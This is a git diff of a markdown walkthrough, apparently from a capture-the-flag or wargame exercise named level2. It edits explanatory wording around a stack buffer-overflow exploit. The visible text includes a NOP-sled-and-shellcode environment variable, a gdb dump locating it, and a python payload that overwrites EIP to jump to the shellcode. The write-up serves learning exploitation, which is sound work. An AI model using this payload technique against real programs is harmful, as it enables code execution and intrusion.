@@ -4,14 +4,14 @@ export EXPLOIT=$(python -c "print '\x90' * 300 + '\x31\xc0\x31\xdb\x31\xc9\x31\x
 ```
 
 Now, we need to find what is the env adress of `EXPLOIT` in `gdb` :
-```bash
+```nasm
 x/1000x $esp - 1000
 0xbffff8e0:	0x90909090	0x90909090	0x90909090	0x90909090
 0xbffff8f0:	0x90909090	0x90909090	0x31909090	0x31db31c0
 ```
  
 We have the end adress of `EXPLOIT` which filled by `x90` representing `nop` instructions in asm.
-We just need to add the padding, set IEP on main return and place our shellcode stored in our environment variable :
+We just need to add the padding, set `EIP` on `p()` return address and add the address of the EXPLOIT in the environnement variable:
 ```bash
 (python -c "print '\x90' * 80 + '\x3e\x85\x04\x08' + '\x04\xf8\xff\xbf'" ; cat) | ./level2
 ????????????????????????????????????????????????????????????????>????????????>???
